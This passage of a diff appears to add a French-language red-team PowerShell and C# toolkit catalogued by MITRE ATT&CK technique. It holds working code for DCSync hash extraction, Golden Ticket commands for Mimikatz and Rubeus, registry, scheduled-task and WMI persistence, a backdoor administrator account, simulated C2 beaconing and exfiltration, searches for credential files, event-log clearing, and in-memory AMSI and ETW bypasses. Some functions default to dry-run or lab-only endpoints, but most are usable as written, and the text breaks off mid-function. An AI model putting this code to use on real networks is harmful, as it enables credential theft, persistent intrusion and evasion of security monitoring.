+   "description": "Simule DCSync via les droits DS-Replication-Get-Changes(-All) pour extraire les hashes du NTDS. Nécessite Domain Admin ou délégation explicite.",
+   "parameters": [
+    {
+     "name": "TargetUser",
+     "datatype": "string",
+     "required": false,
+     "default": "'krbtgt'",
+     "description": "Compte cible (krbtgt, Administrator...)"
+    },
+    {
+     "name": "Domain",
+     "datatype": "string",
+     "required": false,
+     "default": "$env:USERDNSDOMAIN",
+     "description": "Domaine"
+    },
+    {
+     "name": "DryRun",
+     "datatype": "bool",
+     "required": false,
+     "default": "$true",
+     "description": "Dry-run : vérifie les droits sans extraire"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject",
+    "description": "Hash NT/LM + Kerberos keys (ou rapport dry-run)"
+   },
+   "source": "function Invoke-DCSync {\n    param([string]$TargetUser='krbtgt', [string]$Domain=$env:USERDNSDOMAIN, [bool]$DryRun=$true)\n    # Vérifier les droits DS-Replication\n    $dn = (Get-ADDomain -Server $Domain).DistinguishedName\n    $acl = (Get-Acl \"AD:\\$dn\").Access | Where-Object {\n        $_.ActiveDirectoryRights -match 'ExtendedRight' -and\n        $_.ObjectType -in @(\n            [guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', # DS-Replication-Get-Changes\n            [guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes-All\n        )\n    }\n    if($DryRun){\n        Write-RTLog \"DCSYNC_DRYRUN: TargetUser=$TargetUser | ReplicationRights=$($acl.Count) entrée(s)\" -Level 'WARN'\n        return [PSCustomObject]@{ DryRun=$true; Target=$TargetUser; ReplicationACLs=$acl }\n    }\n    # Extraction réelle via .NET DirectoryServices (nécessite les droits de réplication)\n    try {\n        Add-Type -AssemblyName System.DirectoryServices\n        $domain  = New-Object DirectoryServices.DirectoryEntry(\"LDAP://$Domain\")\n        $searcher= New-Object DirectoryServices.DirectorySearcher($domain)\n        $searcher.Filter = \"(sAMAccountName=$TargetUser)\"\n        $searcher.PropertiesToLoad.AddRange(@('unicodePwd','supplementalCredentials','objectSid'))\n        $result  = $searcher.FindOne()\n        $hashRaw = $result.Properties['unicodePwd'][0]\n        $hashHex = [BitConverter]::ToString($hashRaw).Replace('-','')\n        Write-RTLog \"DCSYNC_HIT: $TargetUser | NT=$($hashHex.Substring(0,8))...\" -Level 'ACTION'\n        return [PSCustomObject]@{ DryRun=$false; Target=$TargetUser; NTHash=$hashHex }\n    } catch {\n        Write-RTLog \"DCSYNC_FAIL: $_ -- Droits insuffisants ou LDAP signing actif\" -Level 'ERROR'\n        return $null\n    }\n}",
+   "tags": [
+    "dcsync",
+    "credential",
+    "AD",
+    "replication",
+    "krbtgt"
+   ]
+  },
+  {
+   "id": "fn_rt_013",
+   "type": "function",
+   "name": "Invoke-GoldenTicket",
+   "language": "PowerShell",
+   "famille": "LateralMovement",
+   "mitre": {
+    "tactic": "TA0008 - Lateral Movement",
+    "technique": "T1558.001 - Golden Ticket"
+   },
+   "description": "Prépare les paramètres d'un Golden Ticket Kerberos à partir du hash krbtgt (stub d'assemblage -- injection nécessite Mimikatz/Rubeus out-of-lib). Inclut validation des inputs et log d'audit.",
+   "parameters": [
+    {
+     "name": "KrbtgtHash",
+     "datatype": "string",
+     "required": true,
+     "description": "Hash NT du compte krbtgt"
+    },
+    {
+     "name": "Domain",
+     "datatype": "string",
+     "required": false,
+     "default": "$env:USERDNSDOMAIN",
+     "description": "Domaine"
+    },
+    {
+     "name": "DomainSID",
+     "datatype": "string",
+     "required": false,
+     "default": "$null",
+     "description": "SID du domaine (auto-détecté si null)"
+    },
+    {
+     "name": "TargetUser",
+     "datatype": "string",
+     "required": false,
+     "default": "'Administrator'",
+     "description": "Utilisateur impersonné dans le ticket"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject",
+    "description": "Paramètres du Golden Ticket prêts pour Mimikatz/Rubeus"
+   },
+   "source": "function Invoke-GoldenTicket {\n    param([string]$KrbtgtHash, [string]$Domain=$env:USERDNSDOMAIN,\n          [string]$DomainSID=$null, [string]$TargetUser='Administrator')\n    if(-not $DomainSID){\n        $DomainSID = (Get-ADDomain -Server $Domain).DomainSID.Value\n    }\n    $params = [PSCustomObject]@{\n        User       = $TargetUser\n        Domain     = $Domain\n        DomainSID  = $DomainSID\n        KrbtgtNT   = $KrbtgtHash\n        Validity   = '10 years'\n        MimikatzCmd= \"kerberos::golden /user:$TargetUser /domain:$Domain /sid:$DomainSID /krbtgt:$KrbtgtHash /ptt\"\n        RubeusCmd  = \"Rubeus.exe golden /user:$TargetUser /domain:$Domain /sid:$DomainSID /rc4:$KrbtgtHash /ptt\"\n    }\n    Write-RTLog \"GOLDEN_TICKET_PREP: User=$TargetUser | Domain=$Domain | SID=$DomainSID\" -Level 'ACTION'\n    return $params\n}",
+   "tags": [
+    "lateralmovement",
+    "kerberos",
+    "golden-ticket",
+    "krbtgt"
+   ]
+  },
+  {
+   "id": "fn_rt_014",
+   "type": "function",
+   "name": "Set-PersistenceStartup",
+   "language": "PowerShell",
+   "famille": "Persistence",
+   "mitre": {
+    "tactic": "TA0003 - Persistence",
+    "technique": "T1547.001 - Registry Run Keys"
+   },
+   "description": "Installe une persistance via clé Run, tâche planifiée ou WMI Event Subscription (au choix). Inclut un mode cleanup pour retirer la persistance.",
+   "parameters": [
+    {
+     "name": "Method",
+     "datatype": "string",
+     "required": true,
+     "description": "'Registry' | 'ScheduledTask' | 'WMIEvent'"
+    },
+    {
+     "name": "Payload",
+     "datatype": "string",
+     "required": true,
+     "description": "Commande ou chemin du script à persister"
+    },
+    {
+     "name": "Name",
+     "datatype": "string",
+     "required": false,
+     "default": "'WindowsUpdateHelper'",
+     "description": "Nom de l'entrée de persistance"
+    },
+    {
+     "name": "Cleanup",
+     "datatype": "bool",
+     "required": false,
+     "default": "$false",
+     "description": "Si $true, supprime la persistance"
+    }
+   ],
+   "returns": {
+    "datatype": "bool",
+    "description": "$true si succès"
+   },
+   "source": "function Set-PersistenceStartup {\n    param([string]$Method, [string]$Payload, [string]$Name='WindowsUpdateHelper', [bool]$Cleanup=$false)\n    if($Cleanup){\n        switch($Method){\n            'Registry'      { Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $Name -ErrorAction SilentlyContinue }\n            'ScheduledTask' { Unregister-ScheduledTask -TaskName $Name -Confirm:$false -ErrorAction SilentlyContinue }\n            'WMIEvent'      {\n                Get-WMIObject -Namespace root\\subscription -Class __EventFilter     | Where-Object Name -eq $Name | Remove-WmiObject\n                Get-WMIObject -Namespace root\\subscription -Class CommandLineEventConsumer | Where-Object Name -eq $Name | Remove-WmiObject\n                Get-WMIObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Remove-WmiObject\n            }\n        }\n        Write-RTLog \"PERSISTENCE_REMOVED: Method=$Method Name=$Name\" -Level 'ACTION'\n        return $true\n    }\n    switch($Method){\n        'Registry' {\n            Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $Name -Value $Payload\n        }\n        'ScheduledTask' {\n            $action  = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument \"-WindowStyle Hidden -NonInteractive -Command \\\"$Payload\\\"\"\n            $trigger = New-ScheduledTaskTrigger -AtLogon\n            Register-ScheduledTask -TaskName $Name -Action $action -Trigger $trigger -RunLevel Highest -Force\n        }\n        'WMIEvent' {\n            $filterArgs = @{ Name=$Name; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\" }\n            $filter   = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $filterArgs\n            $consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{ Name=$Name; CommandLineTemplate=$Payload }\n            Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter=$filter; Consumer=$consumer }\n        }\n    }\n    Write-RTLog \"PERSISTENCE_SET: Method=$Method Name=$Name Payload=$($Payload.Substring(0,[Math]::Min(40,$Payload.Length)))...\" -Level 'ACTION'\n    return $true\n}",
+   "tags": [
+    "persistence",
+    "registry",
+    "scheduled-task",
+    "WMI"
+   ]
+  },
+  {
+   "id": "fn_rt_015",
+   "type": "function",
+   "name": "Add-BackdoorLocalAdmin",
+   "language": "PowerShell",
+   "famille": "Persistence",
+   "mitre": {
+    "tactic": "TA0003 - Persistence",
+    "technique": "T1136.001 - Create Local Account"
+   },
+   "description": "Crée un compte backdoor local administrateur (ou le supprime en mode cleanup). Mot de passe auto-généré loggué chiffré.",
+   "parameters": [
+    {
+     "name": "Username",
+     "datatype": "string",
+     "required": false,
+     "default": "'svc_helpdesk_rt'",
+     "description": "Nom du compte backdoor"
+    },
+    {
+     "name": "Cleanup",
+     "datatype": "bool",
+     "required": false,
+     "default": "$false",
+     "description": "Supprime le compte si $true"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject",
+    "description": "Nom, mot de passe généré ou confirmation de suppression"
+   },
+   "source": "function Add-BackdoorLocalAdmin {\n    param([string]$Username='svc_helpdesk_rt', [bool]$Cleanup=$false)\n    if($Cleanup){\n        Remove-LocalUser -Name $Username -ErrorAction SilentlyContinue\n        Write-RTLog \"BACKDOOR_REMOVED: $Username\" -Level 'ACTION'\n        return [PSCustomObject]@{ Action='Removed'; Username=$Username }\n    }\n    # Génère un mot de passe fort aléatoire\n    $chars  = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%^&*'\n    $pwd    = -join (1..20 | ForEach-Object { $chars[(Get-Random -Max $chars.Length)] })\n    $secPwd = ConvertTo-SecureString $pwd -AsPlainText -Force\n    New-LocalUser -Name $Username -Password $secPwd -FullName 'Helpdesk Service' -Description 'RT internal' -PasswordNeverExpires -ErrorAction Stop\n    Add-LocalGroupMember -Group 'Administrators' -Member $Username -ErrorAction Stop\n    # Encoder le mdp pour le log (base64 -- sécurité minimale, fichier log protégé)\n    $encodedPwd = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($pwd))\n    Write-RTLog \"BACKDOOR_CREATED: $Username | B64Pwd=$encodedPwd\" -Level 'ACTION'\n    return [PSCustomObject]@{ Action='Created'; Username=$Username; CleartextPwd=$pwd; B64Pwd=$encodedPwd }\n}",
+   "tags": [
+    "persistence",
+    "local-admin",
+    "backdoor",
+    "account"
+   ]
+  },
+  {
+   "id": "fn_rt_016",
+   "type": "function",
+   "name": "Invoke-BeaconSimulator",
+   "language": "PowerShell",
+   "famille": "C2",
+   "mitre": {
+    "tactic": "TA0011 - Command and Control",
+    "technique": "T1071.001 - Web Protocols"
+   },
+   "description": "Simule un beacon HTTP C2 avec jitter aléatoire. Envoie des heartbeats vers un endpoint contrôlé (loopback ou lab). Ne communique jamais vers Internet.",
+   "parameters": [
+    {
+     "name": "C2Endpoint",
+     "datatype": "string",
+     "required": false,
+     "default": "'http://127.0.0.1:8080/beacon'",
+     "description": "URL du C2 simulé (loopback uniquement)"
+    },
+    {
+     "name": "Jitter",
+     "datatype": "int",
+     "required": false,
+     "default": "30",
+     "description": "Jitter max en secondes"
+    },
+    {
+     "name": "SleepSeconds",
+     "datatype": "int",
+     "required": false,
+     "default": "60",
+     "description": "Intervalle de base"
+    },
+    {
+     "name": "Rounds",
+     "datatype": "int",
+     "required": false,
+     "default": "5",
+     "description": "Nombre de beacon rounds"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject[]",
+    "description": "Historique des rounds"
+   },
+   "source": "function Invoke-BeaconSimulator {\n    param([string]$C2Endpoint='http://127.0.0.1:8080/beacon', [int]$Jitter=30, [int]$SleepSeconds=60, [int]$Rounds=5)\n    # Sécurité : refuser tout endpoint non-loopback\n    if($C2Endpoint -notmatch '127\\.0\\.0\\.1|localhost'){\n        Write-RTLog \"BEACON_ABORT: Endpoint non-loopback interdit ($C2Endpoint)\" -Level 'ERROR'; return @()\n    }\n    $history = @()\n    for($i=1; $i -le $Rounds; $i++){\n        $sleep = $SleepSeconds + (Get-Random -Min (-$Jitter) -Max $Jitter)\n        $body  = @{ hostname=$env:COMPUTERNAME; user=$env:USERNAME; round=$i; ts=(Get-Date -Format o) } | ConvertTo-Json\n        try {\n            $resp = Invoke-RestMethod -Uri $C2Endpoint -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 5\n            $history += [PSCustomObject]@{ Round=$i; Status='OK'; Sleep=$sleep; Response=$resp }\n            Write-RTLog \"BEACON_ROUND $i/$Rounds: OK | Sleep=${sleep}s\" -Level 'ACTION'\n        } catch {\n            $history += [PSCustomObject]@{ Round=$i; Status='FAIL'; Sleep=$sleep; Error=$_.Exception.Message }\n            Write-RTLog \"BEACON_ROUND $i/$Rounds: FAIL | $_\" -Level 'WARN'\n        }\n        if($i -lt $Rounds){ Start-Sleep -Seconds $sleep }\n    }\n    return $history\n}",
+   "tags": [
+    "C2",
+    "beacon",
+    "HTTP",
+    "simulation"
+   ]
+  },
+  {
+   "id": "fn_rt_017",
+   "type": "function",
+   "name": "Invoke-DNSTunnelSimulator",
+   "language": "PowerShell",
+   "famille": "C2",
+   "mitre": {
+    "tactic": "TA0011 - Command and Control",
+    "technique": "T1071.004 - DNS"
+   },
+   "description": "Simule l'exfiltration par tunnel DNS (encoded subdomains). N'envoie aucune vraie requête DNS externe -- log uniquement les requêtes qui seraient générées.",
+   "parameters": [
+    {
+     "name": "Data",
+     "datatype": "string",
+     "required": true,
+     "description": "Données à simuler en exfil"
+    },
+    {
+     "name": "Domain",
+     "datatype": "string",
+     "required": false,
+     "default": "'lab.internal'",
+     "description": "Domaine C2 DNS (lab uniquement)"
+    },
+    {
+     "name": "DryRun",
+     "datatype": "bool",
+     "required": false,
+     "default": "$true",
+     "description": "Si true, log sans envoyer"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject[]",
+    "description": "Liste des requêtes DNS simulées"
+   },
+   "source": "function Invoke-DNSTunnelSimulator {\n    param([string]$Data, [string]$Domain='lab.internal', [bool]$DryRun=$true)\n    if(-not $DryRun -and $Domain -notmatch 'lab|internal|local|test'){\n        Write-RTLog \"DNSTUNNEL_ABORT: Domaine externe interdit ($Domain)\" -Level 'ERROR'; return @()\n    }\n    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Data)) -replace '=',''\n    # Découper en chunks de 30 chars (longueur label DNS max 63)\n    $chunks  = $encoded -split '(.{1,30})' | Where-Object { $_ }\n    $queries = @()\n    $seq     = 0\n    foreach($chunk in $chunks){\n        $fqdn = \"$($seq.ToString('D3')).$chunk.$Domain\"\n        $queries += [PSCustomObject]@{ Seq=$seq; FQDN=$fqdn; DryRun=$DryRun }\n        if(-not $DryRun){\n            try { [System.Net.Dns]::GetHostAddresses($fqdn) } catch {} # erreur attendue en lab\n        }\n        Write-RTLog \"DNSTUNNEL_QUERY[$seq]: $fqdn\" -Level $(if($DryRun){'WARN'}else{'EXFIL'})\n        $seq++\n    }\n    return $queries\n}",
+   "tags": [
+    "C2",
+    "DNS",
+    "tunnel",
+    "exfil",
+    "simulation"
+   ]
+  },
+  {
+   "id": "fn_rt_018",
+   "type": "function",
+   "name": "Invoke-DataExfilSimulation",
+   "language": "PowerShell",
+   "famille": "Exfil",
+   "mitre": {
+    "tactic": "TA0010 - Exfiltration",
+    "technique": "T1048 - Exfiltration Over Alternative Protocol"
+   },
+   "description": "Simule l'exfiltration de fichiers sensibles (recherche, staging, envoi simulé). Trois canaux : HTTP POST, SMB share, SFTP-stub. Ne sort pas du réseau lab.",
+   "parameters": [
+    {
+     "name": "SourcePath",
+     "datatype": "string",
+     "required": true,
+     "description": "Chemin des fichiers à exfiltrer (wildcard OK)"
+    },
+    {
+     "name": "Channel",
+     "datatype": "string",
+     "required": false,
+     "default": "'HTTP'",
+     "description": "'HTTP' | 'SMB' | 'SFTP'"
+    },
+    {
+     "name": "Endpoint",
+     "datatype": "string",
+     "required": false,
+     "default": "'http://127.0.0.1:8080/upload'",
+     "description": "Destination (loopback/lab only)"
+    },
+    {
+     "name": "MaxKB",
+     "datatype": "int",
+     "required": false,
+     "default": "512",
+     "description": "Taille max par fichier (KB)"
+    },
+    {
+     "name": "DryRun",
+     "datatype": "bool",
+     "required": false,
+     "default": "$true",
+     "description": "Si true, liste sans envoyer"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject[]",
+    "description": "Rapport d'exfiltration simulée"
+   },
+   "source": "function Invoke-DataExfilSimulation {\n    param([string]$SourcePath, [string]$Channel='HTTP', [string]$Endpoint='http://127.0.0.1:8080/upload',\n          [int]$MaxKB=512, [bool]$DryRun=$true)\n    if(-not $DryRun -and $Endpoint -notmatch '127\\.0\\.0\\.1|localhost|lab\\.internal|10\\.|192\\.168\\.'){\n        Write-RTLog 'EXFIL_ABORT: Endpoint hors-lab interdit' -Level 'ERROR'; return @()\n    }\n    $files = Get-ChildItem -Path $SourcePath -Recurse -File -ErrorAction SilentlyContinue |\n        Where-Object { $_.Length -le ($MaxKB * 1KB) }\n    $results = foreach($file in $files){\n        $hash = (Get-FileHash $file.FullName -Algorithm SHA256).Hash\n        $sent = $false\n        if(-not $DryRun){\n            switch($Channel){\n                'HTTP' {\n                    $bytes = [IO.File]::ReadAllBytes($file.FullName)\n                    $b64   = [Convert]::ToBase64String($bytes)\n                    $body  = @{ filename=$file.Name; sha256=$hash; data=$b64 } | ConvertTo-Json\n                    try { Invoke-RestMethod -Uri $Endpoint -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10; $sent=$true } catch {}\n                }\n                'SMB'  {\n                    Copy-Item $file.FullName \"$Endpoint\\$($file.Name)\" -Force -ErrorAction SilentlyContinue; $sent=$true\n                }\n                'SFTP' {\n                    Write-RTLog 'EXFIL_SFTP: Stub -- nécessite module Posh-SSH ou WinSCP' -Level 'WARN'\n                }\n            }\n        }\n        Write-RTLog \"EXFIL_FILE: $($file.FullName) | $($file.Length)B | SHA256=${hash.Substring(0,8)}... | Channel=$Channel | Sent=$sent | DryRun=$DryRun\" -Level $(if($DryRun){'WARN'}else{'EXFIL'})\n        [PSCustomObject]@{ File=$file.FullName; SizeB=$file.Length; SHA256=$hash; Channel=$Channel; Sent=$sent; DryRun=$DryRun }\n    }\n    return $results\n}",
+   "tags": [
+    "exfil",
+    "HTTP",
+    "SMB",
+    "staging",
+    "simulation"
+   ]
+  },
+  {
+   "id": "fn_rt_019",
+   "type": "function",
+   "name": "Search-SensitiveFiles",
+   "language": "PowerShell",
+   "famille": "Exfil",
+   "mitre": {
+    "tactic": "TA0009 - Collection",
+    "technique": "T1213 - Data from Information Repositories"
+   },
+   "description": "Recherche les fichiers sensibles (credentials, clés, configs, bases) sur les systèmes cibles via patterns regex et extensions.",
+   "parameters": [
+    {
+     "name": "ComputerName",
+     "datatype": "string",
+     "required": false,
+     "default": "'localhost'",
+     "description": "Machine cible"
+    },
+    {
+     "name": "ScanPaths",
+     "datatype": "string[]",
+     "required": false,
+     "default": "@('C:\\Users','C:\\inetpub','C:\\ProgramData')",
+     "description": "Chemins à scanner"
+    },
+    {
+     "name": "Patterns",
+     "datatype": "string[]",
+     "required": false,
+     "default": "@('*.kdbx','*.pfx','*.key','id_rsa','*.pem','web.config','appsettings*.json','*.env','credentials*')",
+     "description": "Patterns de fichiers"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject[]",
+    "description": "Fichiers sensibles trouvés avec chemin, taille, hash"
+   },
+   "source": "function Search-SensitiveFiles {\n    param([string]$ComputerName='localhost',\n          [string[]]$ScanPaths=@('C:\\Users','C:\\inetpub','C:\\ProgramData'),\n          [string[]]$Patterns=@('*.kdbx','*.pfx','*.key','id_rsa','*.pem','web.config','appsettings*.json','*.env','credentials*'))\n    $results = Invoke-Command -ComputerName $ComputerName -ScriptBlock {\n        param($paths, $patterns)\n        foreach($path in $paths){\n            foreach($pat in $patterns){\n                Get-ChildItem -Path $path -Recurse -Include $pat -ErrorAction SilentlyContinue | ForEach-Object {\n                    [PSCustomObject]@{\n                        FullName     = $_.FullName\n                        SizeB        = $_.Length\n                        LastModified = $_.LastWriteTime\n                        Owner        = (Get-Acl $_.FullName -ErrorAction SilentlyContinue).Owner\n                        SHA256       = (Get-FileHash $_.FullName -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash\n                    }\n                }\n            }\n        }\n    } -ArgumentList $ScanPaths, $Patterns\n    Write-RTLog \"SENSITIVE_FILES: $ComputerName | $($results.Count) fichier(s) trouvé(s)\" -Level 'ACTION'\n    return $results\n}",
+   "tags": [
+    "collection",
+    "exfil",
+    "sensitive",
+    "credentials",
+    "files"
+   ]
+  },
+  {
+   "id": "fn_rt_020",
+   "type": "function",
+   "name": "Invoke-TraceCleanup",
+   "language": "PowerShell",
+   "famille": "OPSEC",
+   "mitre": {
+    "tactic": "TA0005 - Defense Evasion",
+    "technique": "T1070 - Indicator Removal"
+   },
+   "description": "Nettoie les traces laissées pendant l'engagement : logs PowerShell, event logs ciblés, prefetch, historique de commandes, fichiers temporaires RT.",
+   "parameters": [
+    {
+     "name": "ComputerName",
+     "datatype": "string",
+     "required": false,
+     "default": "'localhost'",
+     "description": "Machine à nettoyer"
+    },
+    {
+     "name": "Targets",
+     "datatype": "string[]",
+     "required": false,
+     "default": "@('PSHistory','EventLog','Prefetch','TempFiles','RTLogs')",
+     "description": "Éléments à effacer"
+    },
+    {
+     "name": "DryRun",
+     "datatype": "bool",
+     "required": false,
+     "default": "$true",
+     "description": "Si true, liste sans effacer"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject",
+    "description": "Rapport de nettoyage"
+   },
+   "source": "function Invoke-TraceCleanup {\n    param([string]$ComputerName='localhost',\n          [string[]]$Targets=@('PSHistory','EventLog','Prefetch','TempFiles','RTLogs'),\n          [bool]$DryRun=$true)\n    $report = @{}\n    Invoke-Command -ComputerName $ComputerName -ScriptBlock {\n        param($targets, $dry)\n        if('PSHistory' -in $targets){\n            $h = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath\n            if($h -and (Test-Path $h)){ if(-not $dry){ Clear-Content $h -Force } }\n        }\n        if('EventLog' -in $targets){\n            # Effacer uniquement les logs liés aux actions RT (Security, PowerShell operational)\n            foreach($log in @('Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-WinRM/Operational')){\n                try { if(-not $dry){ [Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($log) } } catch {}\n            }\n        }\n        if('Prefetch' -in $targets){\n            Get-ChildItem 'C:\\Windows\\Prefetch' -Filter '*.pf' -ErrorAction SilentlyContinue |\n                Where-Object { $_.Name -match 'POWERSHELL|CMD|PSEXEC' } |\n                ForEach-Object { if(-not $dry){ Remove-Item $_.FullName -Force } }\n        }\n        if('TempFiles' -in $targets){\n            Get-ChildItem $env:TEMP -Recurse -ErrorAction SilentlyContinue |\n                ForEach-Object { if(-not $dry){ Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue } }\n        }\n        if('RTLogs' -in $targets){\n            $rtlog = \"$env:TEMP\\RT_Ops.log\"\n            if(Test-Path $rtlog){ if(-not $dry){ Remove-Item $rtlog -Force } }\n        }\n    } -ArgumentList $Targets, $DryRun\n    Write-RTLog \"CLEANUP: $ComputerName | Targets=$($Targets -join ',') | DryRun=$DryRun\" -Level 'ACTION'\n    return [PSCustomObject]@{ ComputerName=$ComputerName; Targets=$Targets; DryRun=$DryRun }\n}",
+   "tags": [
+    "opsec",
+    "cleanup",
+    "anti-forensics",
+    "eventlog",
+    "prefetch"
+   ]
+  },
+  {
+   "id": "fn_rt_021",
+   "type": "function",
+   "name": "Invoke-AMSIBypass",
+   "language": "PowerShell",
+   "famille": "DefenseEvasion",
+   "mitre": {
+    "tactic": "TA0005 - Defense Evasion",
+    "technique": "T1562.001 - Disable or Modify Tools"
+   },
+   "description": "Patch AMSI en mémoire via reflection .NET (technique Matt Graeber). Valide uniquement sur session PowerShell courante -- ne modifie pas les fichiers système.",
+   "parameters": [
+    {
+     "name": "Validate",
+     "datatype": "bool",
+     "required": false,
+     "default": "$true",
+     "description": "Vérifie que le bypass fonctionne après application"
+    }
+   ],
+   "returns": {
+    "datatype": "bool",
+    "description": "$true si AMSI désactivé"
+   },
+   "source": "function Invoke-AMSIBypass {\n    param([bool]$Validate=$true)\n    try {\n        $amsiAssembly = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n        $amsiField    = $amsiAssembly.GetField('amsiInitFailed','NonPublic,Static')\n        $amsiField.SetValue($null,$true)\n        Write-RTLog 'AMSI_BYPASS: amsiInitFailed=True (session courante)' -Level 'ACTION'\n        if($Validate){\n            # Test : si AMSI est bypassé, cette string ne devrait pas déclencher de blocage\n            $testResult = $amsiField.GetValue($null)\n            Write-RTLog \"AMSI_BYPASS_VALIDATE: amsiInitFailed=$testResult\" -Level 'ACTION'\n            return $testResult -eq $true\n        }\n        return $true\n    } catch {\n        Write-RTLog \"AMSI_BYPASS_FAIL: $_ (peut nécessiter des droits élevés ou PS7+)\" -Level 'ERROR'\n        return $false\n    }\n}",
+   "tags": [
+    "defense-evasion",
+    "AMSI",
+    "bypass",
+    "reflection"
+   ]
+  },
+  {
+   "id": "fn_rt_022",
+   "type": "function",
+   "name": "Invoke-ETWBypass",
+   "language": "CSharp",
+   "famille": "DefenseEvasion",
+   "mitre": {
+    "tactic": "TA0005 - Defense Evasion",
+    "technique": "T1562.006 - Indicator Blocking"
+   },
+   "description": "Patch ETW (EtwEventWrite) en mémoire pour la session courante. Réduit la télémétrie Windows sans modifier les fichiers système.",
+   "parameters": [
+    {
+     "name": "dryRun",
+     "datatype": "bool",
+     "required": false,
+     "default": "true",
+     "description": "Si true, affiche l'adresse ciblée sans patcher"
+    }
+   ],
+   "returns": {
+    "datatype": "string",
+    "description": "Adresse mémoire patchée ou rapport dry-run"
+   },
+   "source": "public static string Invoke-ETWBypass(bool dryRun = true) {\n    IntPtr ntdll = LoadLibrary(\"ntdll.dll\");\n    IntPtr etwAddr = GetProcAddress(ntdll, \"EtwEventWrite\");\n    if (etwAddr == IntPtr.Zero) return \"EtwEventWrite introuvable\";\n    if (dryRun) return $\"[DRY-RUN] EtwEventWrite @ 0x{etwAddr.ToInt64():X}\";\n    // Patch : remplacer le prologue par RET (0xC3 sur x64)\n    uint oldProtect;\n    VirtualProtect(etwAddr, (UIntPtr)1, 0x40 /* PAGE_EXECUTE_READWRITE */, out oldProtect);\n    Marshal.WriteByte(etwAddr, 0xC3);\n    VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);\n    return $\"ETW_PATCHED @ 0x{etwAddr.ToInt64():X}\";\n}\n[DllImport(\"kernel32\")] static extern IntPtr LoadLibrary(string lib);\n[DllImport(\"kernel32\")] static extern IntPtr GetProcAddress(IntPtr mod, string proc);\n[DllImport(\"kernel32\")] static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);",
+   "tags": [
+    "defense-evasion",
+    "ETW",
+    "patch",
+    "telemetry",
+    "CSharp"
+   ]
+  },
+  {
+   "id": "fn_rt_023",
+   "type": "function",
+   "name": "New-RTEngagementReport",
+   "language": "PowerShell",
+   "famille": "Reporting",
+   "mitre": {
+    "tactic": "",
+    "technique": ""
+   },
+   "description": "Génère un rapport HTML complet de l'engagement à partir du fichier de log RT_Ops.log : timeline, findings par phase MITRE, score de criticité.",
+   "parameters": [
+    {
+     "name": "LogPath",
+     "datatype": "string",
+     "required": false,
+     "default": "\"$env:TEMP\\RT_Ops.log\"",
+     "description": "Fichier de log de l'engagement"
+    },
+    {
+     "name": "OutputPath",
+     "datatype": "string",
+     "required": false,
+     "default": "\"$env:TEMP\\RT_Report_$(Get-Date -Format yyyyMMdd).html\"",
+     "description": "Fichier de sortie HTML"
+    },
+    {
+     "name": "EngagementName",
+     "datatype": "string",
+     "required": false,
+     "default": "'DSI Red Team Engagement'",
+     "description": "Nom de l'engagement"
+    }
+   ],
+   "returns": {
+    "datatype": "string",
+    "description": "Chemin du rapport HTML généré"
+   },
+   "source": "function New-RTEngagementReport {\n    param([string]$LogPath=\"$env:TEMP\\RT_Ops.log\",\n          [string]$OutputPath=\"$env:TEMP\\RT_Report_$(Get-Date -Format yyyyMMdd).html\",\n          [string]$EngagementName='DSI Red Team Engagement')\n    if(-not (Test-Path $LogPath)){ Write-RTLog \"REPORT_FAIL: Log introuvable ($LogPath)\" -Level 'ERROR'; return $null }\n    $lines = Get-Content $LogPath\n    # Parser les entrées du log\n    $entries = $lines | ForEach-Object {\n        if($_ -match '\\[(\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2})\\]\\[([A-Z]+)\\] (.*)'){\n            [PSCustomObject]@{ TS=$Matches[1]; Level=$Matches[2]; Msg=$Matches[3] }\n        }\n    }\n    # Compter par niveau\n    $actions = ($entries | Where-Object Level -eq 'ACTION').Count\n    $warns   = ($entries | Where-Object Level -eq 'WARN').Count\n    $errors  = ($entries | Where-Object Level -eq 'ERROR').Count\n    $exfils  = ($entries | Where-Object Level -eq 'EXFIL').Count\n    # Score de criticité\n    $score = [Math]::Min(100, ($actions * 3) + ($exfils * 10) + ($warns * 1))\n    # Tableau HTML des entrées\n    $rows = $entries | ForEach-Object {\n        $color = switch($_.Level){'ERROR'{'#ff6b6b'}'WARN'{'#ffd93d'}'ACTION'{'#6bcb77'}'EXFIL'{'#ff4d4d'}default{'#f0f0f0'}}\n        \"<tr 